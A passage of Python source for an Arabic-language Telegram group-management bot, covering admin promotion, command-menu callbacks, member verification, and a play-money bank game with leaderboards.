        m.from_user.id, m.chat.id
    ):
        id = int(r.get(f"{m.from_user.id}:promote:{m.chat.id}"))
        if text.startswith("*"):
            r.delete(f"{m.from_user.id}:promote:{m.chat.id}")
            if text.startswith("**"):
                can_promote_members = True
                type = 1
            else:
                can_promote_members = False
                type = 0
            if len(text.split()) > 1:
                title = text.split(None, 1)[1][:15:]
            else:
                title = None
            c.promote_chat_member(
                m.chat.id,
                id,
                privileges=ChatPrivileges(
                    can_manage_chat=True,
                    can_delete_messages=True,
                    can_manage_video_chats=True,
                    can_restrict_members=True,
                    can_promote_members=can_promote_members,
                    can_change_info=True,
                    can_invite_users=True,
                    can_pin_messages=True,
                ),
            )
            if title:
                try:
                    c.set_administrator_title(m.chat.id, id, title)
                except:
                    pass
            get = m.chat.get_member(id)
            if type == 1:
                r.set(f"{m.chat.id}:rankADMIN:{get.user.id}{Dev_Zaid}", 1)
                r.sadd(f"{m.chat.id}:listADMIN:{Dev_Zaid}", get.user.id)
                return m.reply(
                    f"الحلو 「 {get.user.mention} 」\n{k} رفعته مشرف بكل صلاحيات "
                )
            else:
                r.set(f"{m.chat.id}:rankADMIN:{get.user.id}{Dev_Zaid}", 1)
                r.sadd(f"{m.chat.id}:listADMIN:{Dev_Zaid}", get.user.id)
                return m.reply(
                    f"الحلو 「 {get.user.mention} 」\n{k} رفعته مشرف بكل الصلاحيات عدا رفع المشرفين"
                )

    if text == "مسح قائمة التثبيت":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المدير وفوق ) بس")
        else:
            c.unpin_all_chat_messages(m.chat.id)
            return m.reply(f"{k} ابشر مسحت قائمة التثبيت")

    if (
        text == "الاوامر"
        or text.lower() == "/commands"
        or text.lower() == f"/commands@{botUsername.lower()}"
    ):
        if admin_pls(m.from_user.id, m.chat.id):
            channel = (
                r.get(f"{Dev_Zaid}:BotChannel")
                if r.get(f"{Dev_Zaid}:BotChannel")
                else "YQYQY6"
            )
            return m.reply(
                f"{k} اهلين فيك باوامر البوت\n\nللاستفسار - @{channel}",
                reply_markup=InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton(
                                "م1", callback_data=f"commands1:{m.from_user.id}"
                            ),
                            InlineKeyboardButton(
                                "م2", callback_data=f"commands2:{m.from_user.id}"
                            ),
                        ],
                        [
                            InlineKeyboardButton(
                                "م3", callback_data=f"commands3:{m.from_user.id}"
                            ),
                        ],
                        [
                            InlineKeyboardButton(
                                "الالعاب", callback_data=f"commands4:{m.from_user.id}"
                            ),
                            InlineKeyboardButton(
                                "التسليه", callback_data=f"commands5:{m.from_user.id}"
                            ),
                        ],
                        [
                            InlineKeyboardButton(
                                "اليوتيوب", callback_data=f"commands6:{m.from_user.id}"
                            ),
                        ],
                        [
                            InlineKeyboardButton(
                                "البنك", callback_data=f"commands7:{m.from_user.id}"
                            ),
                            InlineKeyboardButton(
                                "زواج", callback_data=f"commands8:{m.from_user.id}"
                            ),
                        ],
                    ]
                ),
            )
        else:
            return m.reply(f"{k} هذا الأمر يخص ( الادمن وفوق ) بس")


@Client.on_callback_query(group=1)
def CallbackQueryHandler(c, m):
    channel = (
        r.get(f"{Dev_Zaid}:BotChannel") if r.get(f"{Dev_Zaid}:BotChannel") else "YQYQY6"
    )
    Thread(target=CallbackQueryResponse, args=(c, m, channel)).start()


def CallbackQueryResponse(c, m, channel):
    k = r.get(f"{Dev_Zaid}:botkey")
    if m.data == f"commands1:{m.from_user.id}":
        m.edit_message_text(
            f"""
للاستفسار - @{channel}


❨ اوامر الرفع والتنزيل ❩

⌯ رفع ↣ ↢ تنزيل مشرف
⌯ رفع ↣ ↢ تنزيل مالك اساسي
⌯ رفع ↣ ↢ تنزيل مالك
⌯ رفع ↣ ↢ تنزيل مدير
⌯ رفع ↣ ↢ تنزيل ادمن
⌯ رفع ↣ ↢ تنزيل مميز
⌯ تنزيل الكل  ↢ بالرد  ↢ لتنزيل الشخص من جميع رتبه
⌯ مسح الكل  ↢ بدون رد  ↢ لتنزيل كل رتب المجموعة

❨ اوامر المسح ❩

⌯ مسح المالكيين
⌯ مسح المدراء
⌯ مسح الادمنيه
⌯ مسح المميزين
⌯ مسح المحظورين
⌯ مسح المكتومين
⌯ مسح قائمة المنع
⌯ مسح رتبه
⌯ مسح الرتب
⌯ مسح الردود
⌯ مسح الاوامر
⌯ مسح + العدد
⌯ مسح بالرد
⌯ مسح الترحيب
⌯ مسح قائمة التثبيت

❨ اوامر الطرد الحظر الكتم ❩

⌯ حظر ↢ ❨ بالرد،بالمعرف،بالايدي ❩
⌯ طرد ↢ ❨ بالرد،بالمعرف،بالايدي ❩
⌯ كتم ↢ ❨ بالرد،بالمعرف،بالايدي ❩
⌯ تقيد ↢ ❨ بالرد،بالمعرف،بالايدي ❩
⌯ الغاء الحظر ↢ ❨ بالرد،بالمعرف،بالايدي ❩
⌯ الغاء الكتم ↢ ❨ بالرد،بالمعرف،بالايدي ❩
⌯ الغاء التقييد ↢ ❨ بالرد،بالمعرف،بالايدي ❩
⌯ رفع القيود ↢ لحذف الكتم,الحظر,التقييد
⌯ منع الكلمة
⌯ منع بالرد على قيف او ستيكر
⌯ الغاء منع الكلمة
⌯ طرد البوتات
⌯ كشف البوتات

❨ اوامر النطق ❩

⌯ انطقي + الكلمة
⌯ وش يقول؟ + بالرد على فويس لترجمه المحتوى

❨ اوامر اخرى ❩

⌯ الرابط
⌯ معلومات الرابط
⌯ انشاء رابط
⌯ بايو
⌯ بايو عشوائي
⌯ ايدي
⌯ الانشاء
⌯ مجموعاتي
⌯ ابلاغ
⌯ نقل ملكية
⌯ صوره
⌯ افتاري
⌯ افتار + باليوزر او الرد
⌯ مين ضافني؟
⌯ شازام، قرآن، سورة + اسم السورة
""",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("م1 ‣", callback_data="None"),
                        InlineKeyboardButton(
                            "م2", callback_data=f"commands2:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "م3", callback_data=f"commands3:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "الالعاب", callback_data=f"commands4:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "التسليه", callback_data=f"commands5:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "اليوتيوب", callback_data=f"commands6:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "البنك", callback_data=f"commands7:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "زواج", callback_data=f"commands8:{m.from_user.id}"
                        ),
                    ],
                ]
            ),
        )
        return

    if m.data == f"commands2:{m.from_user.id}":
        m.edit_message_text(
            f"""
للاستفسار - @{channel}


❨ اوامر الوضع ❩

⌯ وضع ترحيب
⌯ وضع قوانين
⌯ تغيير رتبه
⌯ تغيير امر

❨ اوامر رؤية الاعدادات ❩

⌯ المطورين
⌯ المالكيين الاساسيين
⌯ المالكيين
⌯ الادمنيه
⌯ المدراء
⌯ المشرفين
⌯ المميزين
⌯ القوانين
⌯ قائمه المنع
⌯ المكتومين
⌯ المطور
⌯ معلوماتي
⌯ الاعدادت
⌯ المجموعه
⌯ الساعه
⌯ التاريخ
⌯ صلاحياتي
⌯ لقبي
⌯ صلاحياته + بالرد
""",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "م1", callback_data=f"commands1:{m.from_user.id}"
                        ),
                        InlineKeyboardButton("م2 ‣", callback_data="None"),
                    ],
                    [
                        InlineKeyboardButton(
                            "م3", callback_data=f"commands3:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "الالعاب", callback_data=f"commands4:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "التسليه", callback_data=f"commands5:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "اليوتيوب", callback_data=f"commands6:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "البنك", callback_data=f"commands7:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "زواج", callback_data=f"commands8:{m.from_user.id}"
                        ),
                    ],
                ]
            ),
        )
        return

    if m.data == f"commands3:{m.from_user.id}":
        m.edit_message_text(
            f"""
للاستفسار - @{channel}


❨ اوامر الردود ❩

⌯ الردود ↢ تشوف كل الردود المضافه
⌯ الردود المتعدده ↢ تشوف كل الردود المتعدده المضافه
⌯ اضف رد ↢ عشان تضيف رد
⌯ اضف رد متعدد ↢ عشان تضيف أكثر من رد
⌯ اضف رد متعدد ↢ خاص بالاعضاء
⌯ مسح رد ↢ عشان تمسح الرد
⌯ مسح رد متعدد ↢ عشان تمسح رد متعدد
⌯ مسح ردي ↢ عشان تمسح ردك اذا كان بردود الأعضاء
⌯ مسح الردود ↢ تمسح كل الردود
⌯ مسح الردود المتعدده ↢ عشان تمسح كل الردود المتعدده
⌯ الرد + كلمة الرد
-

❨ اوامر القفل والفتح بالمسح ❩

⌯ قفل ↣ ↢ فتح  التعديل
⌯ قفل ↣ ↢ فتح  الفويسات
⌯ قفل ↣ ↢ فتح  الفيديو
⌯ قفل ↣ ↢ فتح  الـصــور
⌯ قفل ↣ ↢ فتح  الملصقات
⌯ قفل ↣ ↢ فتح  الدخول
⌯ قفل ↣ ↢ فتح  الفارسية
⌯ قفل ↣ ↢ فتح  الملفات
⌯ قفل ↣ ↢ فتح  المتحركات
⌯ قفل ↣ ↢ فتح  تعديل الميديا
⌯ قفل ↣ ↢ فتح  تعديل الميديا بالتقييد
⌯ قفل ↣ ↢ فتح  الدردشه
⌯ قفل ↣ ↢ فتح  الروابط
⌯ قفل ↣ ↢ فتح  الهشتاق
⌯ قفل ↣ ↢ فتح  البوتات
⌯ قفل ↣ ↢ فتح  اليوزرات
⌯ قفل ↣ ↢ فتح  الاشعارات
⌯ قفل ↣ ↢ فتح  الكلام الكثير
⌯ قفل ↣ ↢ فتح  التكرار
⌯ قفل ↣ ↢ فتح  التوجيه
⌯ قفل ↣ ↢ فتح  الانلاين
⌯ قفل ↣ ↢ فتح  الجهات
⌯ قفل ↣ ↢ فتح  الــكـــل
⌯ قفل ↣ ↢ فتح  السب
⌯ قفل ↣ ↢ فتح  الاضافه
⌯ قفل ↣ ↢ فتح  الصوت
⌯ قفل ↣ ↢ فتح  القنوات
⌯ قفل ↣ ↢ فتح الايراني
⌯ قفل ↣ ↢ فتح الإباحي

❨ اوامر التفعيل والتعطيل ❩

⌯ تفعيل ↣ ↢ تعطيل الترحيب
⌯ تفعيل ↣ ↢ تعطيل الترحيب بالصورة
⌯ تفعيل ↣ ↢ تعطيل الردود
⌯ تفعيل ↣ ↢ تعطيل ردود الاعضاء
⌯ تفعيل ↣ ↢ تعطيل الايدي
⌯ تفعيل ↣ ↢ تعطيل الرابط
⌯ تفعيل ↣ ↢ تعطيل اطردني
⌯ تفعيل ↣ ↢ تعطيل الحماية
⌯ تفعيل ↣ ↢ تعطيل المنشن
⌯ تفعيل ↣ ↢ تعطيل التحقق
⌯ تفعيل ↣ ↢ تعطيل ردود المطور
⌯ تفعيل ↣ ↢ تعطيل التحذير
⌯ تفعيل ↣ ↢ تعطيل البايو
⌯ تفعيل ↣ ↢ تعطيل انطقي
⌯ تفعيل ↣ ↢ تعطيل شازام
""",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "م1", callback_data=f"commands1:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "م2", callback_data=f"commands2:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton("م3 ‣", callback_data="None"),
                    ],
                    [
                        InlineKeyboardButton(
                            "الالعاب", callback_data=f"commands4:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "التسليه", callback_data=f"commands5:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "اليوتيوب", callback_data=f"commands6:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "البنك", callback_data=f"commands7:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "زواج", callback_data=f"commands8:{m.from_user.id}"
                        ),
                    ],
                ]
            ),
        )
        return

    if m.data == f"commands4:{m.from_user.id}":
        m.edit_message_text(
            """
☤ تفعيل الالعاب
☤ تعطيل الالعاب
    ╼╾
✽ جمل
✽ كلمات
✽ اغاني
✽ دين
✽ عربي
✽ اكمل
✽ صور
✽ كت تويت
✽ مؤقت
✽ اعلام
✽ معاني
✽ تخمين
✽ احكام
✽ ارقام
✽ احسب
✽ خواتم
✽ انقليزي
✽ ترتيب
✽ انمي
✽ تركيب
✽ تفكيك
✽ عواصم
✽ روليت
✽ سيارات
✽ ايموجي
✽ حجره
✽ تشفير
✽ كره قدم
✽ ديمون
╼╾
❖ فلوسي ↼ عشان تشوف فلوسك
❖ بيع فلوسي + العدد ↼ للأستبدال
""",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "م1", callback_data=f"commands1:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "م2", callback_data=f"commands2:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "م3", callback_data=f"commands3:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton("الالعاب ‣", callback_data="None"),
                        InlineKeyboardButton(
                            "التسليه", callback_data=f"commands5:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "اليوتيوب", callback_data=f"commands6:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "البنك", callback_data=f"commands7:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "زواج", callback_data=f"commands8:{m.from_user.id}"
                        ),
                    ],
                ]
            ),
        )
        return

    if m.data == f"commands5:{m.from_user.id}":
        m.edit_message_text(
            f"""
للاستفسار - @{channel}

🍰 ⌯ رفع ↣ ↢ تنزيل كيكه
🍯 ⌯ رفع ↣ ↢ تنزيل عسل
💩 ⌯ رفع ↣ ↢ تنزيل زق
🦓 ⌯ رفع ↣ ↢ تنزيل حمار
🐄 ⌯ رفع ↣ ↢ تنزيل بقره
🐩 ⌯ رفع ↣ ↢ تنزيل كلب
🐒 ⌯ رفع ↣ ↢ تنزيل قرد
🐐 ⌯ رفع ↣ ↢ تنزيل تيس
🐂 ⌯ رفع ↣ ↢ تنزيل ثور
🏅 ⌯ رفع ↣ ↢ تنزيل هكر
🐓 ⌯ رفع ↣ ↢ تنزيل دجاجه
🧱 ⌯ رفع ↣ ↢ تنزيل ملكه
🔫 ⌯ رفع ↣ ↢ تنزيل صياد
🐏 ⌯ رفع ↣ ↢ تنزيل خاروف
❤️ ⌯ رفع لقلبي ↣ ↢ تنزيل من قلبي

⌯ قائمة الكيك
⌯ قائمة العسل
⌯ قائمة الزق
⌯ قائمة الحمير
⌯ قائمة البقر
⌯ قائمة الكلاب
⌯ قائمة القرود
⌯ قائمة التيس
⌯ قائمة الثور
⌯ قائمة الهكر
⌯ قائمة الدجاج
⌯ قائمة الهطوف
⌯ قائمة الصيادين
⌯ قائمة الخرفان
""",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "م1", callback_data=f"commands1:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "م2", callback_data=f"commands2:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "م3", callback_data=f"commands3:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "الالعاب", callback_data=f"commands4:{m.from_user.id}"
                        ),
                        InlineKeyboardButton("التسليه ‣", callback_data="None"),
                    ],
                    [
                        InlineKeyboardButton(
                            "اليوتيوب", callback_data=f"commands6:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "البنك", callback_data=f"commands7:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "زواج", callback_data=f"commands8:{m.from_user.id}"
                        ),
                    ],
                ]
            ),
        )
        return

    if m.data == f"commands6:{m.from_user.id}":
        m.edit_message_text(
            """
⚘ اليـوتيوب

تفعيل اليوتيوب
تعطيل اليوتيوب

❋ البـحث عن اغنية ↓

بحث اسم الاغنية

يوت اسم الاغنية
⚘ الساوند كلاود

تفعيل الساوند
تعطيل الساوند

❋ البـحث عن اغنية ↓

رابط الاغنية أو ساوند + اسم الاغنية


⚘ التيك توك

تفعيل التيك
تعطيل للتيك

❋ للتحميل من التيك ↓

تيك ورابط المقطع
""",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "م1", callback_data=f"commands1:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "م2", callback_data=f"commands2:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "م3", callback_data=f"commands3:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "الالعاب", callback_data=f"commands4:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "التسليه", callback_data=f"commands5:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton("اليوتيوب ‣", callback_data="None"),
                    ],
                    [
                        InlineKeyboardButton(
                            "البنك", callback_data=f"commands7:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "زواج", callback_data=f"commands8:{m.from_user.id}"
                        ),
                    ],
                ]
            ),
        )
        return

    if m.data == f"commands7:{m.from_user.id}":
        m.edit_message_text(
            """
✜ اوامر البنك

⌯ انشاء حساب بنكي  ↢ تسوي حساب وتقدر تحول فلوس مع مزايا ثانيه

⌯ مسح حساب بنكي  ↢ تلغي حسابك البنكي

⌯ تحويل ↢ تطلب رقم حساب الشخص وتحول له فلوس

⌯ حسابي  ↢ يطلع لك رقم حسابك عشان تعطيه للشخص اللي بيحول لك

⌯ فلوسي ↢ يعلمك كم فلوسك

⌯ راتب ↢ يعطيك راتبك كل ٥ دقيقة

⌯ بخشيش ↢ يعطيك بخشيش كل ٥ دقايق

⌯ زرف ↢ تزرف فلوس اشخاص كل ٥ دقايق

⌯ كنز ↢ يعطيك كنز كل ١٠ دقايق

⌯ استثمار ↢ تستثمر بالمبلغ اللي تبيه مع نسبة ربح مضمونه من ١٪؜ الى ١٥٪؜ ( او استثمار فلوسي )

⌯ حظ ↢ تلعبها بأي مبلغ ياتدبله ياتخسره انت وحظك ( او حظ فلوسي )

⌯ عجله ↢ تلعب عجله الحظ ولو تشابهو ال ٣ ايموجيات تكسب من ١٠٠ الف لحد ٣٠٠ الف انت وحظك

⌯ توب الفلوس ↢ يطلع توب اكثر ناس معهم فلوس بكل القروبات

⌯ توب الحراميه ↢ يطلع لك اكثر ناس زرفوا
""",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "م1", callback_data=f"commands1:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "م2", callback_data=f"commands2:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "م3", callback_data=f"commands3:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "الالعاب", callback_data=f"commands4:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "التسليه", callback_data=f"commands5:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "اليوتيوب", callback_data=f"commands6:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton("البنك ‣", callback_data="None"),
                        InlineKeyboardButton(
                            "زواج", callback_data=f"commands8:{m.from_user.id}"
                        ),
                    ],
                ]
            ),
        )
        return

    if m.data == f"commands8:{m.from_user.id}":
        m.edit_message_text(
            """
✜ اوامر الزواج

⌯ زواج  ↢ تكتبه بالرد على رسالة شخص مع المهر ويزوجك

⌯ زواجي  ↢ يطلع وثيقة زواجك اذا متزوج

⌯ طلاق ↢ يطلقك اذا متزوج

⌯ خلع  ↢ يخلع زوجك ويرجع له المهر

⌯ زواجات ↢ يطلع اغلى الزواجات بالقروب
""",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "م1", callback_data=f"commands1:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "م2", callback_data=f"commands2:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "م3", callback_data=f"commands3:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "الالعاب", callback_data=f"commands4:{m.from_user.id}"
                        ),
                        InlineKeyboardButton(
                            "التسليه", callback_data=f"commands5:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "اليوتيوب", callback_data=f"commands6:{m.from_user.id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "البنك", callback_data=f"commands7:{m.from_user.id}"
                        ),
                        InlineKeyboardButton("زواج ‣", callback_data="None"),
                    ],
                ]
            ),
        )
        return

    if m.data == "delAdminMSG":
        if str(m.from_user.id) in m.message.text.html:
            return m.message.delete()

    if m.data == f"yes:{m.from_user.id}":
        try:
            c.restrict_chat_member(
                m.message.chat.id,
                m.from_user.id,
                ChatPermissions(
                    can_send_messages=True,
                    can_send_media_messages=True,
                    can_send_other_messages=True,
                    can_send_polls=True,
                    can_invite_users=True,
                    can_add_web_page_previews=True,
                    can_change_info=True,
                    can_pin_messages=True,
                ),
            )
        except:
            return False
        m.edit_message_text(
            f"""
{k} تم التحقق منك وطلعت مو زومبي
{k} الحين تقدر تسولف بالقروب
☆
""",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("🧚‍♀️", url=f"t.me/{channel}")]]
            ),
        )

    if m.data == f"no:{m.from_user.id}":
        return m.edit_message_text(
            f"""
{k} للأسف طلعت زومبي 🧟‍♀️
{k} مالك غير تنطر حد من المشرفين يجي يتوسطلك
☆
""",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "رفع التقييد والسماح",
                            callback_data=f"yesVER:{m.from_user.id}",
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            "طرد", callback_data=f"noVER:{m.from_user.id}"
                        )
                    ],
                ]
            ),
        )

    if m.data.startswith("yesVER"):
        user_id = int(m.data.split(":")[1])
        if not admin_pls(m.from_user.id, m.message.chat.id):
            return m.answer(f"{k} هذا الزر يخص ( الادمن وفوق ) بس", show_alert=True)
        else:
            m.edit_message_text(f"{k} توسطلك واحد من الادمن ورفعت عنك القيود")
            try:
                c.restrict_chat_member(
                    m.message.chat.id,
                    user_id,
                    ChatPermissions(
                        can_send_messages=True,
                        can_send_media_messages=True,
                        can_send_other_messages=True,
                        can_send_polls=True,
                        can_invite_users=True,
                        can_add_web_page_previews=True,
                        can_change_info=True,
                        can_pin_messages=True,
                    ),
                )
            except:
                return False

    if m.data.startswith("noVER"):
        user_id = int(m.data.split(":")[1])
        if not admin_pls(m.from_user.id, m.message.chat.id):
            return m.answer(f"{k} هذا الزر يخص ( الادمن وفوق ) بس", show_alert=True)
        else:
            m.edit_message_text(f"{k} انقلع برا القروب يلا")
            try:
                m.message.chat.ban_member(user_id)
                m.message.chat.unban_member(user_id)
            except:
                pass

    if m.data == "yes:del:bank":
        if not devp_pls(m.from_user.id, m.message.chat.id):
            return m.answer("تعجبني ثقتك")
        else:
            m.edit_message_text("ابشر صفرت البنك")
            keys = r.keys("*:Floos")
            for a in keys:
                r.delete(a)
            for a in r.keys("*:BankWait"):
                r.delete(a)
            for a in r.keys("*:BankWaitB5"):
                r.delete(a)
            for a in r.keys("*:BankWaitZRF"):
                r.delete(a)
            for a in r.keys("*:BankWaitEST"):
                r.delete(a)
            for a in r.keys("*:BankWaitHZ"):
                r.delete(a)
            for a in r.keys("*:BankWait3JL"):
                r.delete(a)
            for a in r.keys("*:Zrf"):
                r.delete(a)
            r.delete("BankTop")
            r.delete("BankTopZRF")
            return True

    if m.data == "no:del:bank":
        if not devp_pls(m.from_user.id, m.message.chat.id):
            return m.answer("تعجبني ثقتك")
        else:
            m.message.delete()

    if m.data == f"topfloos:{m.from_user.id}":
        if not r.smembers("BankList"):
            return m.answer(f"{k} مافيه حسابات بالبنك", show_alert=True)
        else:
            rep = InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("‣ 💸", callback_data="None"),
                        InlineKeyboardButton(
                            "توب الحرامية 💰", callback_data=f"topzrf:{m.from_user.id}"
                        ),
                    ],
                    [InlineKeyboardButton("🧚‍♀️", url=f"t.me/{channel}")],
                ]
            )
            if r.get("BankTop"):
                text = r.get("BankTop")
                if not r.get(f"{m.from_user.id}:Floos"):
                    floos = 0
                else:
                    floos = int(r.get(f"{m.from_user.id}:Floos"))
                get = r.ttl("BankTop")
                wait = time.strftime("%M:%S", time.gmtime(get))
                text += "\n━━━━━━━━━"
                text += f"\n# You ) {floos:,} 💸 l {m.from_user.first_name}"
                text += f"\n\n[قوانين التُوب](https://t.me/{botUsername}?start=rules)"
                text += f"\n\nالقائمة تتحدث بعد {wait} دقيقة"
                return m.edit_message_text(
                    text, disable_web_page_preview=True, reply_markup=rep
                )
            else:
                users = []
                ccc = 0
                for user in r.smembers("BankList"):
                    ccc += 1
                    id = int(user)
                    if r.get(f"{id}:bankName"):
                        name = r.get(f"{id}:bankName")[:10]
                    else:
                        try:
                            name = c.get_chat(id).first_name
                            r.set(f"{id}:bankName", name)
                        except:
                            name = "INVALID_NAME"
                            r.set(f"{id}:bankName", name)
                    if not r.get(f"{id}:Floos"):
                        floos = 0
                    else:
                        floos = int(r.get(f"{id}:Floos"))
                    users.append({"name": name, "money": floos})
                top = get_top(users)
                text = "توب 20 اغنى اشخاص:\n\n"
                count = 0
                for user in top:
                    count += 1
                    if count == 21:
                        break
                    emoji = get_emoji_bank(count)
                    floos = user["money"]
                    name = user["name"]
                    text += f'**{emoji}{floos:,}** 💸 l {name.replace("*","").replace("`","").replace("|","").replace("#","").replace("<","").replace(">","").replace("_","")}\n'
                r.set("BankTop", text, ex=300)
                if not r.get(f"{m.from_user.id}:Floos"):
                    floos_from_user = 0
                else:
                    floos_from_user = int(r.get(f"{m.from_user.id}:Floos"))
                text += "\n━━━━━━━━━"
                text += f"\n# You ) {floos_from_user:,} 💸 l {m.from_user.first_name}"
                text += f"\n\n[قوانين التُوب](https://t.me/{botUsername}?start=rules)"
                get = r.ttl("BankTop")
                wait = time.strftime("%M:%S", time.gmtime(get))
                text += f"\n\nالقائمة تتحدث بعد {wait} دقيقة"
                m.edit_message_text(
                    text, disable_web_page_preview=True, reply_markup=rep
                )

    if m.data == f"topzrf:{m.from_user.id}":
        if not r.smembers("BankList"):
            return m.answer(f"{k} مافيه حسابات بالبنك", show_alert=True)
        else:
            rep = InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "توب الفلوس 💸", callback_data=f"topfloos:{m.from_user.id}"
                        ),
                        InlineKeyboardButton("‣ 💰", callback_data="None"),
                    ],
                    [InlineKeyboardButton("🧚‍♀️", url=f"t.me/{channel}")],
                ]
            )
            if r.get("BankTopZRF"):
                text = r.get("BankTopZRF")
                if not r.get(f"{m.from_user.id}:Zrf"):
                    zrf = 0
                else:
                    zrf = int(r.get(f"{m.from_user.id}:Zrf"))
                get = r.ttl("BankTopZRF")
                wait = time.strftime("%M:%S", time.gmtime(get))
                text += "\n━━━━━━━━━"
                text += f"\n# You ) {zrf:,} 💰 l {m.from_user.first_name}"
                text += f"\n\n[قوانين التُوب](https://t.me/{botUsername}?start=rules)"
                text += f"\n\nالقائمة تتحدث بعد {wait} دقيقة"
                return m.edit_message_text(
                    text, disable_web_page_preview=True, reply_markup=rep
                )
            else:
                users = []
                ccc = 0
                for user in r.smembers("BankList"):
                    ccc += 1
                    id = int(user)
                    if r.get(f"{id}:bankName"):
                        name = r.get(f"{id}:bankName")[:10]
                    else:
                        try:
                            name = c.get_chat(id).first_name
                            r.set(f"{id}:bankName", name)
                        except:
                            name = "INVALID_NAME"
                            r.set(f"{id}:bankName", name)
                    if not r.get(f"{id}:Zrf"):
                        pass
                    else:
                        zrf = int(r.get(f"{id}:Zrf"))
                        users.append({"name": name, "money": zrf})
                top = get_top(users)
                text = "توب 20 اكثر الحراميه زرفًا:\n\n"
                count = 0
                for user in top:
                    count += 1
                    if count == 21:
                        break
                    emoji = get_emoji_bank(count)
                    floos = user["money"]
                    name = user["name"]
                    text += f'**{emoji}{floos}** 💰 l {name.replace("*","").replace("`","").replace("|","").replace("#","").replace("<","").replace(">","").replace("_","")}\n'
                r.set("BankTopZRF", text, ex=300)
                if not r.get(f"{m.from_user.id}:Zrf"):
                    floos_from_user = 0
                else:
                    floos_from_user = int(r.get(f"{m.from_user.id}:Zrf"))
                text += "\n━━━━━━━━━"
                text += f"\n# You ) {floos_from_user} 💰 l {m.from_user.first_name}"
                text += f"\n\n[قوانين التُوب](https://t.me/{botUsername}?start=rules)"
                get = r.ttl("BankTopZRF")
                wait = time.strftime("%M:%S", time.gmtime(get))
                text += f"\n\nالقائمة تتحدث بعد {wait} دقيقة"
                m.edit_message_text(
                    text, disable_web_page_preview=True, reply_markup=rep
                )

    """
   if m.data == f'toplast:{m.from_user.id}':
     if not r.get(f'BankTopLast') and not r.get(f'BankTopLastZrf'):
       return m.answer(f'{k} مافي توب اسبوع الي فات',show_alert=True)
     else:
       text = 'توب أوائل الأسبوع الي راح:\n'
       text += r.get(f'BankTopLast')
       text += '\n\nتوب حرامية الاسبوع اللي راح:\n'
       text += r.get(f'BankTopLastZrf')
       text += '\n༄'
       rep = InlineKeyboardMarkup (
         [[InlineKeyboardButton ('🧚‍♀️', url=f't.me/{channel}')]]
